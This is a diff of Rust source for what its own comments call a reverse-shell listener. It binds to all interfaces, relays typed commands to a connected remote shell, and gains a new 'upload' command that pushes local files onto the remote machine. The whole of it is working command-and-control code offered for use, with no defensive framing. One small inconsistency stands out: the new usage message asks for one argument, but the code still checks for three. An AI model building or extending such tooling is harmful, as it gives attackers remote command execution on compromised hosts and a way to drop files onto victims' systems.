@@ -1,17 +1,18 @@
 #[cfg(feature = "listener")]
 use std::net::{TcpListener, TcpStream};
-use std::io::{Read, Write};
+use std::io::{self, Read, Write};
+use std::fs::File;
 use std::thread;
 
 pub fn start_listener() {
     let args: Vec<String> = std::env::args().collect();
     
     if args.len() != 3 {
-        eprintln!("Usage: {} <ip> <port>", args[0]);
+        eprintln!("Usage: {} <port>", args[0]);
         return;
     }
 
-    let ip = &args[1];
+    let ip = "0.0.0.0";
     let port = &args[2];
     
     let listener = TcpListener::bind(format!("{}:{}", ip, port)).expect("Failed to bind listener");
@@ -36,20 +37,38 @@ pub fn start_listener() {
 fn handle_client(mut stream: TcpStream) {
     let mut buffer = [0; 1024];
     loop {
-
-        print!("$ "); // Affiche un prompt de type # sans saut de ligne
+        print!("$ "); // Affiche un prompt de type $ sans saut de ligne
         std::io::stdout().flush().unwrap(); // Force l'affichage immédiat du prompt
         
         // Lecture de la commande entrée dans le terminal
         let mut command = String::new();
         std::io::stdin().read_line(&mut command).expect("Failed to read line");
 
-        if command.trim() == "exit" {
+        let trimmed_command = command.trim();
+
+        if trimmed_command == "exit" {
             break;
         }
 
+        // Gestion de la commande upload
+        if trimmed_command.starts_with("upload ") {
+            let args: Vec<&str> = trimmed_command.split_whitespace().collect();
+            if args.len() != 3 {
+                println!("Usage: upload <local_file> <remote_file>");
+                continue;
+            }
+
+            let local_file = args[1];
+            let remote_file = args[2];
+
+            if let Err(e) = upload(&mut stream, local_file, remote_file) {
+                println!("Error uploading file: {}", e);
+            }
+            continue;
+        }
+
         // Envoi de la commande au reverse shell
-        if let Err(e) = stream.write(command.as_bytes()) {
+        if let Err(e) = stream.write(trimmed_command.as_bytes()) {
             eprintln!("Failed to send command: {}", e);
             break;
         }
@@ -66,4 +85,22 @@ fn handle_client(mut stream: TcpStream) {
             }
         }
     }
+}
+
+// Fonction pour envoyer un fichier au client
+fn upload(stream: &mut TcpStream, local_file: &str, remote_file: &str) -> io::Result<()> {
+    // Lis le fichier local
+    let mut file = File::open(local_file)?;
+    let mut file_data = Vec::new();
+    file.read_to_end(&mut file_data)?;
+
+    // Prépare une commande spéciale pour informer le client qu'un fichier arrive
+    let header = format!("UPLOAD {} {}\n", remote_file, file_data.len());
+    stream.write_all(header.as_bytes())?;
+
+    // Envoie les données du fichier
+    stream.write_all(&file_data)?;
+    println!("File '{}' uploaded as '{}'", local_file, remote_file);
+
+    Ok(())
 }
